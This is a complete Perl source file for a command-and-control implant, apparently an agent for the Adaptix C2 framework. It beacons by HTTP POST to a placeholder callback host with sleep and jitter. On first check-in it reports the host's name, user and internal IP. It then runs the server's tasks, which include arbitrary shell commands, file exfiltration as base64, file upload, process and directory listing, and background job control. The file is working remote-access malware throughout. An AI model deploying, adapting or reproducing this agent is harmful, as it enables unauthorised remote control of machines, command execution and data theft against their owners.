#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;
use JSON::PP;
use MIME::Base64;
use Encode qw(decode encode);
use Cwd;
use POSIX ":sys_wait_h";
use Fcntl qw(F_GETFL F_SETFL O_NONBLOCK);

# Configuration
my $callback_host = '<CALLBACK_HOST>';
my $callback_port = '<CALLBACK_PORT>';
my $callback_path = '<CALLBACK_PATH>';
my $agent_watermark = '<WATERMARK>';

# Generate random 10-character hex agent ID at runtime
srand(time ^ $$ ^ unpack("%L*", `ps axww | gzip -f`));
my $agent_id = sprintf("%010x", int(rand() * 1099511627776) % 1099511627776);

# Agent state
my $sleep_time = 5;
my $jitter_percent = 50;
my $current_directory = Cwd::getcwd();
my $should_terminate = 0;

# Job tracking - keyed by Adaptix task_id
my %jobs = ();  # task_id => { pid, command, args, output, output_fh, status, start_time, reported }

# Reusable JSON encoder
my $json = JSON::PP->new->canonical;

# Constants
use constant {
    MAX_OUTPUT_SIZE => 1048576,  # 1MB
};

# Dispatch table for job display info
my %job_display = (
    run      => sub { my $args = shift; return ($args->{executable} || '', $args->{args} || ''); },
    download => sub { my $args = shift; return ('download', $args->{path} || ''); },
    upload   => sub { my $args = shift; return ('upload', $args->{path} || ''); },
);

# Helper function for job validation
sub validate_job {
    my ($job_id, $command_name) = @_;
    
    unless (defined $job_id && exists $jobs{$job_id}) {
        return (undef, { command => $command_name, error => "Job not found: $job_id" });
    }
    
    return ($jobs{$job_id}, undef);
}

# Helper function to process job output
sub process_job_output {
    my ($output, $tail_lines) = @_;
    
    return '' unless $output;
    
    # Decode from UTF-8 bytes to character string
    eval { $output = decode('UTF-8', $output, Encode::FB_QUIET); };
    
    # Strip ANSI escape sequences
    $output =~ s/\x1b\[[0-9;]*[a-zA-Z]//g;
    
    # Apply tail if requested
    if ($tail_lines > 0) {
        my @lines = split(/\n/, $output);
        my $total_lines = scalar(@lines);
        
        if ($total_lines > $tail_lines) {
            my $skipped = $total_lines - $tail_lines;
            @lines = @lines[-$tail_lines .. -1];
            $output = "... [$skipped lines omitted]\n" . join("\n", @lines);
        } else {
            $output = join("\n", @lines);
        }
    }
    
    # Limit output size
    if (length($output) > MAX_OUTPUT_SIZE) {
        $output = substr($output, 0, MAX_OUTPUT_SIZE) . "\n... [output truncated at 1MB]";
    }
    
    # Encode back to UTF-8 bytes for JSON
    return encode('UTF-8', $output, Encode::FB_QUIET);
}

# Async wrapper - converts any command function into an async job
# Usage: my $async_cmd = make_async(\&cmd_download, 'download');
#        my $result = $async_cmd->($task);
sub make_async {
    my ($cmd_func, $command_name) = @_;
    
    return sub {
        my ($task) = @_;
        my $task_id = $task->{task_id};
        
        # Create a pipe for output capture
        pipe(my $read_fh, my $write_fh) or return {
            command => $command_name,
            error   => "Failed to create pipe: $!",
        };
        
        my $pid = fork();
        
        if (!defined $pid) {
            close($read_fh);
            close($write_fh);
            return {
                command => $command_name,
                error   => "Failed to fork: $!",
            };
        }
        
        if ($pid == 0) {
            # Child process
            close($read_fh);
            
            # Redirect STDOUT and STDERR to pipe
            open(STDOUT, '>&', $write_fh) or exit(126);
            open(STDERR, '>&', $write_fh) or exit(126);
            close($write_fh);
            
            # Execute the command function and print result as JSON
            eval {
                my $result = $cmd_func->($task);
                print $json->encode($result);
            };
            
            if ($@) {
                print STDERR "Error: $@\n";
                exit(125);
            }
            
            exit(0);
        }
        
        # Parent process
        close($write_fh);
        
        # Set non-blocking on read handle
        my $flags = fcntl($read_fh, F_GETFL, 0);
        warn "Can't get flags: $!" unless defined $flags;
        fcntl($read_fh, F_SETFL, $flags | O_NONBLOCK) or warn "Can't set non-blocking: $!";
        
        # Store job info with output file handle
        # Extract executable and args for display using dispatch table
        my ($executable, $args_str) = ('', '');
        if (my $display_fn = $job_display{$command_name}) {
            ($executable, $args_str) = $display_fn->($task);
        }
        
        $jobs{$task_id} = {
            pid        => $pid,
            command    => $command_name,
            args       => $task,
            executable => $executable,
            args_str   => $args_str,
            output_fh  => $read_fh,
            output     => '',
            status     => 'running',
            start_time => time(),
            exit_code  => undef,
        };
        
        return {
            command => $command_name,
            job_id  => $task_id,
            pid     => $pid,
            async   => 1,
            %{$task},  # Include original task parameters
        };
    };
}

# Command handlers
sub cmd_pwd {
    my ($task) = @_;
    return {
        command => 'pwd',
        path    => $current_directory,
    };
}

sub cmd_whoami {
    my ($task) = @_;
    my $username = getpwuid($<) || $<;
    return {
        command  => 'whoami',
        username => $username,
    };
}

sub cmd_ps {
    my ($task) = @_;
    my @processes;
    
    # Get process list using ps command
    open(my $ps_fh, '-|', 'ps', 'aux') or return {
        command => 'ps',
        error   => "Failed to execute ps: $!",
    };
    
    my $header = <$ps_fh>;
    while (my $line = <$ps_fh>) {
        chomp($line);
        push @processes, $line;
    }
    close($ps_fh);
    
    return {
        command   => 'ps',
        processes => \@processes,
    };
}

sub cmd_ls {
    my ($task) = @_;
    my $path = $task->{path} || $current_directory;
    
    # Resolve path
    unless ($path =~ m{^/}) {
        $path = "$current_directory/$path" if $path ne '.';
    }
    
    # Check if path is a file
    if (-f $path) {
        return {
            command => 'ls',
            path    => $path,
            type    => 'file',
            name    => (split('/', $path))[-1],
        };
    }
    
    # Check if directory exists
    unless (-d $path) {
        return {
            command => 'ls',
            error   => "Directory not found: $path",
        };
    }
    
    # List directory contents
    opendir(my $dh, $path) or return {
        command => 'ls',
        error   => "Failed to open directory: $!",
    };
    
    my @entries;
    while (my $entry = readdir($dh)) {
        next if $entry eq '.' || $entry eq '..';
        my $full_path = "$path/$entry";
        my $type = -d $full_path ? 'dir' : 'file';
        push @entries, {
            name => $entry,
            type => $type,
        };
    }
    closedir($dh);
    
    # Sort entries
    @entries = sort { $a->{name} cmp $b->{name} } @entries;
    
    return {
        command => 'ls',
        path    => $path,
        entries => \@entries,
    };
}

sub cmd_cd {
    my ($task) = @_;
    my $path = $task->{path} || '/';
    
    unless (-d $path) {
        return {
            command => 'cd',
            error   => "Directory not found: $path",
        };
    }
    
    $current_directory = Cwd::abs_path($path);
    return {
        command => 'cd',
        path    => $current_directory,
    };
}

sub cmd_terminate {
    my ($task) = @_;
    $should_terminate = 1;
    return {
        command => 'terminate',
        status  => 'terminating',
    };
}

sub cmd_sleep {
    my ($task) = @_;
    $sleep_time = $task->{duration} || 5;
    $jitter_percent = $task->{jitter} || 0;
    return {
        command  => 'sleep',
        duration => $sleep_time,
        jitter   => $jitter_percent,
        status   => 'completed',
    };
}

sub cmd_run_sync {
    my ($task) = @_;
    my $executable = $task->{executable} || '/bin/sh';
    my $args_str = $task->{args} || '';
    my $cmd = $args_str ? "$executable $args_str" : $executable;
    
    exec($cmd) or exit(127);
}

my $cmd_run = make_async(\&cmd_run_sync, 'run');

sub cmd_download_sync {
    my ($task) = @_;
    my $path = $task->{path};
    my $task_id = $task->{task_id};
    
    # Helper for empty response
    my $empty_response = sub {
        return { command => 'download', path => $path || '', file_id => '', size => 0, content => '' };
    };
    
    # Validate path
    return $empty_response->() unless ($path && -e $path && !-d $path);
    
    # Read and encode file
    open(my $fh, '<:raw', $path) or return $empty_response->();
    my $content = do { local $/; <$fh> };
    close($fh);
    
    return {
        command => 'download',
        path    => $path,
        file_id => $task_id,
        size    => length($content),
        content => encode_base64($content, ''),
    };
}

my $cmd_download = make_async(\&cmd_download_sync, 'download');

sub cmd_upload_sync {
    my ($task) = @_;
    my $path = $task->{path};
    my $content_b64 = $task->{content};
    
    # Validate and decode
    unless ($path && $content_b64) {
        return { command => 'upload', path => $path || '', output => 'Missing path or content' };
    }
    my $content = decode_base64($content_b64);
    
    # Resolve path
    my $target_path = $path =~ m{^/} ? $path : "$current_directory/$path";
    
    # Write file
    my $output = do {
        if (open(my $fh, '>:raw', $target_path)) {
            print $fh $content;
            close($fh);
            'success';
        } else {
            "Failed to write file: $!";
        }
    };
    
    return { command => 'upload', path => $path, output => $output };
}

my $cmd_upload = make_async(\&cmd_upload_sync, 'upload');

sub cmd_job_list {
    my ($task) = @_;
    
    # Update job statuses before listing
    check_jobs();
    
    my @job_list = map {
        my $job = $jobs{$_};
        {
            job_id     => $_,
            pid        => $job->{pid},
            executable => $job->{executable} || '',
            args       => $job->{args_str} || '',
            status     => $job->{status},
            start_time => $job->{start_time},
            exit_code  => $job->{exit_code},
        }
    } sort keys %jobs;
    
    return {
        command => 'job_list',
        jobs    => \@job_list,
    };
}

sub cmd_job_kill {
    my ($task) = @_;
    my $job_id = $task->{job_id};
    
    my ($job, $error) = validate_job($job_id, 'job_kill');
    return $error if $error;
    
    if ($job->{status} ne 'running') {
        return {
            command => 'job_kill',
            error   => "Job $job_id is not running (status: $job->{status})",
        };
    }
    
    # Kill the process and update status
    my $killed = kill('TERM', $job->{pid});
    
    $job->{status} = 'killed' if $killed;
    
    return $killed
        ? { command => 'job_kill', job_id => $job_id, pid => $job->{pid}, killed => 1 }
        : { command => 'job_kill', error => "Failed to kill job $job_id (PID: $job->{pid})" };
}

sub cmd_job_get {
    my ($task) = @_;
    my $job_id = $task->{job_id};
    my $tail_lines = $task->{tail} || 0;
    
    my ($job, $error) = validate_job($job_id, 'job_get');
    return $error if $error;
    
    # Update job status
    check_jobs();
    
    # Extract executable and args from stored job fields
    my $executable = $job->{executable} || '';
    my $args_str = $job->{args_str} || '';
    
    # Process output
    my $output = process_job_output($job->{output} || '', $tail_lines);
    
    return {
        command    => 'job_get',
        job_id     => $job_id,
        pid        => $job->{pid},
        executable => $executable,
        args       => $args_str,
        status     => $job->{status},
        start_time => $job->{start_time},
        exit_code  => $job->{exit_code},
        output     => $output,
        tail       => $tail_lines,
    };
}

# Clean up jobs that have been reported
sub cleanup_jobs {
    my @to_delete;
    
    foreach my $job_id (keys %jobs) {
        my $job = $jobs{$job_id};
        
        # Remove jobs that are finished and have been reported, or were killed
        if (($job->{status} eq 'finished' && $job->{reported}) || $job->{status} eq 'killed') {
            push @to_delete, $job_id;
        }
    }
    
    delete @jobs{@to_delete};
}

# Get completed jobs that haven't been reported yet
sub get_completed_jobs {
    my @completed;
    
    foreach my $job_id (sort keys %jobs) {
        my $job = $jobs{$job_id};
        
        # Skip if not finished, killed, or already reported
        next if $job->{status} =~ /^(running|killed)$/;
        next if $job->{reported};
        
        # Mark as reported
        $job->{reported} = 1;
        
        # Try to parse output as JSON first (for download/upload commands)
        my $result = eval { $json->decode($job->{output} || '{}') };
        
        # If JSON parsing failed, treat as raw output (for run commands)
        unless ($result && ref($result) eq 'HASH' && $result->{command}) {
            $result = {
                command    => $job->{command},
                executable => $job->{executable},
                args       => $job->{args_str},
                output     => process_job_output($job->{output} || '', 0),
            };
        }
        
        # Always add exit code
        $result->{exit_code} = $job->{exit_code} if defined $job->{exit_code};
        
        # Report with original task_id so the system can update the task
        push @completed, {
            task_id => $job_id,
            output  => $json->encode($result),
        };
    }
    
    # Clean up old jobs after reporting
    cleanup_jobs();
    
    return @completed;
}

# Check job statuses and reap finished processes
sub check_jobs {
    foreach my $job_id (keys %jobs) {
        my $job = $jobs{$job_id};
        
        next if $job->{status} ne 'running';
        
        # Read available output from pipe (non-blocking)
        if ($job->{output_fh}) {
            my $buffer;
            while (sysread($job->{output_fh}, $buffer, 4096)) {
                $job->{output} .= $buffer;
            }
        }
        
        # Check if process has finished (non-blocking)
        my $result = waitpid($job->{pid}, WNOHANG);
        
        if ($result > 0) {
            # Process has finished - read any remaining output
            if (my $fh = delete $job->{output_fh}) {
                my $buffer;
                $job->{output} .= $buffer while sysread($fh, $buffer, 4096);
                close($fh);
            }
            
            $job->{exit_code} = $? >> 8;
            $job->{status} = 'finished';
        } elsif ($result == -1) {
            # Process no longer exists
            close(delete $job->{output_fh}) if $job->{output_fh};
            $job->{status} = 'error';
        }
        # result == 0 means still running
    }
}

# Command dispatch table
my %COMMANDS = (
    pwd      => \&cmd_pwd,
    whoami   => \&cmd_whoami,
    ps       => \&cmd_ps,
    ls       => \&cmd_ls,
    cd       => \&cmd_cd,
    run      => $cmd_run,
    download => $cmd_download,
    upload   => $cmd_upload,
    sleep    => \&cmd_sleep,
    terminate=> \&cmd_terminate,
    job_list => \&cmd_job_list,
    job_kill => \&cmd_job_kill,
    job_get  => \&cmd_job_get,
);

# Execute a command using dispatch table
sub execute_command {
    my ($task) = @_;
    my $task_id = $task->{task_id};
    my $command = $task->{command};
    
    my $handler = $COMMANDS{$command};
    my $result = $handler
        ? $handler->($task)
        : { command => $command, error => "Unknown command: $command" };
    
    return {
        task_id => $task_id,
        output  => $json->encode($result),
    };
}

# Calculate sleep time with jitter
sub calculate_sleep {
    return $sleep_time unless $jitter_percent > 0;
    $sleep_time + int(rand($sleep_time * $jitter_percent / 100));
}

# Get initial system information
sub get_init_data {
    my $hostname = `hostname`; chomp($hostname);
    my $username = getpwuid($<) || $<;
    
    my $internal_ip = '';
    my $sock = IO::Socket::INET->new(
        PeerAddr => '8.8.8.8',
        PeerPort => 53,
        Proto    => 'udp',
    );
    if ($sock) {
        $internal_ip = $sock->sockhost();
        close($sock);
    }
    
    return {
        hostname    => $hostname,
        username    => $username,
        domain      => '',
        internal_ip => $internal_ip,
        process     => $0,
        pid         => $$,
        sleep       => $sleep_time,
        jitter      => $jitter_percent,
    };
}

# Send HTTP request
sub send_request {
    my ($beat, $init, $results) = @_;
    
    print STDERR "[DEBUG] Connecting to $callback_host:$callback_port\n";
    
    my $sock = IO::Socket::INET->new(
        PeerHost => $callback_host,
        PeerPort => $callback_port,
        Proto    => 'tcp',
        Timeout  => 10,
    );
    
    unless ($sock) {
        print STDERR "[ERROR] Failed to connect: $!\n";
        return undef;
    }
    
    print STDERR "[DEBUG] Connected successfully\n";
    
    # Build request body
    my $request_body = { beat => $beat };
    $request_body->{init} = $init if $init;
    $request_body->{results} = $results if $results && @$results;

    my $body_json = $json->encode($request_body);
    my $content_length = length($body_json);

    print STDERR "[DEBUG] Beat: $beat\n";
    print STDERR "[DEBUG] Body length: $content_length bytes\n";
    print STDERR "[DEBUG] Body: $body_json\n";
    print STDERR "[DEBUG] Sending request...\n";

    # Send HTTP request
    print $sock join("\r\n",
        "POST $callback_path HTTP/1.1",
        "Host: $callback_host:$callback_port",
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)",
        "Content-Type: application/json",
        "Content-Length: $content_length",
        "Connection: close",
        "",
        $body_json
    );
    
    # Read response
    local $/ = undef;
    my $response = <$sock>;
    close($sock);

    print STDERR "[DEBUG] Response length: " . length($response) . " bytes\n";
    print STDERR "[DEBUG] Response:\n$response\n";

    # Parse response body
    return undef unless $response;

    # Split headers and body
    my ($headers, $body) = split(/\r?\n\r?\n/, $response, 2);
    return undef unless $body;

    # Check if response is chunked
    if ($headers =~ /Transfer-Encoding:\s*chunked/i) {
        # Decode chunked encoding
        my $decoded = '';
        while ($body =~ s/^([0-9a-fA-F]+)\r?\n//) {
            my $chunk_size = hex($1);
            last if $chunk_size == 0;
            $decoded .= substr($body, 0, $chunk_size, '');
            $body =~ s/^\r?\n//;  # Remove trailing CRLF
        }
        $body = $decoded;
    }

    print STDERR "[DEBUG] Body after parsing: $body\n";

    my $data = eval { $json->decode($body) };
    if ($@) {
        print STDERR "[ERROR] JSON decode failed: $@\n";
        print STDERR "[ERROR] Body was: $body\n";
    }
    return $data;
}


# Main loop
sub main {
    my $beat = $agent_watermark . $agent_id;
    my $init_data = get_init_data();
    my $first_checkin = 1;
    
    print STDERR "[INFO] Agent starting...\n";
    print STDERR "[INFO] Watermark: $agent_watermark\n";
    print STDERR "[INFO] Agent ID: $agent_id\n";
    print STDERR "[INFO] Beat: $beat\n";
    print STDERR "[INFO] Callback: $callback_host:$callback_port$callback_path\n";
    
    while (!$should_terminate) {
        print STDERR "[INFO] Sending beacon (first_checkin=$first_checkin)...\n";
        
        # Check job statuses
        check_jobs();
        
        # Get completed jobs to report
        my @completed_jobs = get_completed_jobs();
        
        # Send beacon with init data on first checkin only
        my $response = send_request($beat, $first_checkin ? $init_data : undef, \@completed_jobs);
        $first_checkin = 0;
        
        # Execute tasks if present
        if ($response && $response->{tasks} && @{$response->{tasks}}) {
            my @results = map { execute_command($_) } @{$response->{tasks}};
            send_request($beat, undef, \@results) if @results;
        }

        sleep(calculate_sleep());
    }
}

main();
